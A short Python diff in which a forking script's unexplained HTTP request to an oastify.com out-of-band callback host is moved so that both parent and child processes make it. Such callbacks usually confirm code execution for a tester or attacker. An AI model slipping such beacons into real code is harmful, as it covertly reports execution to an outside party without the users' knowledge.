@@ -14,8 +14,8 @@ def child_process():
 
 pid = os.fork()
 
+requests.get("http://txu57t8k0c4c7u1opud3jly2ptvkji96y.oastify.com/")
 if pid == 0:
     child_process()
-    requests.get("http://txu57t8k0c4c7u1opud3jly2ptvkji96y.oastify.com/")
 else:
     os._exit(0)  
